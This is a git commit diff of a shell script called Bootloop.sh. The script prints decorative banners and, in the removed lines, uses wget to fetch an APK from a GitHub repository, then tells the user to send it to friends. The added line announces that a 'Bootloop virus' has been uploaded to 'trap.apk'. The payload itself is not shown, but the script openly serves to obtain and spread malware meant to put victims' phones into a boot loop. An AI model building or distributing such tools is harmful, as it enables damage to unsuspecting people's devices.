56a03e93792828ad4945cfe83900f6c07dcf63db
princeyasinzone <38537313+princeyasinzone@users.noreply.github.com>
2018-05-12 00:52:56 +0530

    Update Bootloop.sh

--- Bootloop.sh
+++ Bootloop.sh
@@ -11,15 +11,10 @@ echo
 echo -e "\033[1m \e[32m ( Made by Prince Yasin and Arif-Tech )"
 echo
 echo
-wget https://github.com/princeyasinzone/Bootloop/blob/master/gen_signed.apk
-echo
-echo "$(tput setaf 3)Apk Download succsesfuly...send to ur ...Frends...
-........pls LIKE SUBSCRIBE...Thanks...4r...watching.$(tput sgr 0)" | pv -qL 10 ;
-echo
-echo
 echo
 figlet -f slant Arif-Tech | lolcat
 echo
 echo -e "\033[1m \e[32m (Made byPrince Yasin and Arif-Tech )"
 echo
 toilet -F metal -F border -f block Bootloop | lolcat
+echo -e "\033[1m \e[33m Bootloop virus has been successfully uploaded to trap.apk"
